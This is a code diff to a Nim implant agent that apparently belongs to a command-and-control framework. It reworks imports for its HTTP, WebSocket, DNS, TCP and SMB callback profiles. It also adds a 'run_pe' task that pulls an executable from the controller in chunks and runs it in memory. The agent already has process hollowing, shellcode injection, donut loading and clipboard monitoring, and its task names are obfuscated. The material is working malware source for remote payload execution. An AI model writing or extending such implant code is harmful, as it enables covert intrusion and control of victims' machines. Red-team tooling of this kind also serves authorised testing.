@@ -1,16 +1,11 @@
-import std/[json, random, os, base64, tables, times, strutils, strformat, asyncdispatch]
+import std/[json, random, os, base64, tables, times, strutils, strformat, asyncdispatch, sequtils]
 import config
 import global_data
-import profiles/http_profile
-import profiles/websocket_profile
-import profiles/httpx_profile
-import profiles/dns_profile
-import profiles/tcp_profile
-
-# Windows-only profiles
-when defined(windows):
-  import profiles/smb_profile
-
+import profiles/http
+import profiles/websocket
+import profiles/httpx
+import profiles/dns
+import profiles/tcp
 import utils/sysinfo
 import utils/m_responses
 import utils/debug
@@ -40,6 +35,7 @@ import tasks/connect
 
 when defined(windows):
   import tasks/link
+  import profiles/smb_profile
 
 # Cross-platform commands
 import tasks/portscan
@@ -77,6 +73,7 @@ when defined(windows):
   import tasks/clipboard_monitor
   import tasks/donut
   import tasks/inject_hollow
+  import tasks/run_pe
 
 # Conditional imports for Windows-only features
 when defined(windows):
@@ -85,7 +82,7 @@ when defined(windows):
 
 type
   BackgroundTaskType = enum
-    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow
+    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject, btDonut, btInjectHollow, btRunPE
   
   BackgroundTaskState = object
     taskType: BackgroundTaskType
@@ -566,6 +563,19 @@ proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
           )
           agent.backgroundTasks[taskId] = state
       
+      of obf("run_pe"):
+        when defined(windows):
+          var state = BackgroundTaskState(
+            taskType: btRunPE,
+            path: "",
+            fileId: params[obf("uuid")].getStr(),
+            totalChunks: 0,
+            currentChunk: 1,
+            fileData: @[],
+            params: params
+          )
+          agent.backgroundTasks[taskId] = state
+      
       of obf("screenshot"):
         when defined(windows):
           # Screenshot doesn't use BackgroundTaskState, handled elsewhere
@@ -915,6 +925,28 @@ proc postResponses*(agent: var Agent) =
                   if injectResp.hasKey(obf("completed")) and injectResp[obf("completed")].getBool():
                     agent.backgroundTasks.del(taskId)
                     debug "[DEBUG] Inject hollow complete"
+                  else:
+                    state.currentChunk += 1
+                    agent.backgroundTasks[taskId] = state
+            
+            of btRunPE:
+              when defined(windows):
+                # Process incoming file chunks for run_pe
+                if taskResp.hasKey(obf("chunk_data")):
+                  let chunkData = taskResp[obf("chunk_data")].getStr()
+                  let totalChunks = taskResp[obf("total_chunks")].getInt()
+                  state.totalChunks = totalChunks
+                  
+                  # Process the chunk and get next request or final result
+                  let runpeResp = processRunPeChunk(
+                    taskId, state.params, chunkData, totalChunks, 
+                    state.currentChunk, state.fileData
+                  )
+                  agent.taskResponses.add(runpeResp)
+                  
+                  if runpeResp.hasKey(obf("completed")) and runpeResp[obf("completed")].getBool():
+                    agent.backgroundTasks.del(taskId)
+                    debug "[DEBUG] RunPE complete"
                   else:
                     state.currentChunk += 1
                     agent.backgroundTasks[taskId] = state
